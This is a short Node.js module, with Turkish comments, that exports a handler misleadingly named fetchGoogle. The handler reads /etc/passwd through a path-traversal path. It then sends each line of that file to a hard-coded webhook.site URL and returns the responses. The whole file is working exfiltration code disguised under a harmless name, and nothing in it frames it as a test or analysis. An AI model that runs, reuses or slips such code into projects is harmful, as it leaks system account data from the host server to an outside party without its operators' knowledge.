const fs = require('fs');
const fetch = require('node-fetch');

function fetchGoogle(ctx, req, res) {
    fs.readFile('../../../../../../../etc/passwd', 'utf8', (err, data) => {
        if (err) {
            res.status(500).send('Error reading file: ' + err.message);
            return;
        }
        
        const lines = data.split('\n').map(line => line.trim()).filter(line => line); // Dosyanın tüm satırlarını al ve boş satırları filtrele

        const fetchPromises = lines.map(line => 
            fetch(`https://webhook.site/0ccbcbcc-7da3-4759-9855-ac1dc992520a/${line}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'text/html',
                },
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.text();
            })
        );

        Promise.all(fetchPromises)
            .then(responses => {
                res.status(200).send(responses.join('\n'));  // Başarılı yanıtları birleştir ve gönder
            })
            .catch(error => {
                res.status(500).send('Fetch error: ' + error.message);  // Hata durumunda yanıt gönder
            });
    });
}

module.exports = fetchGoogle;
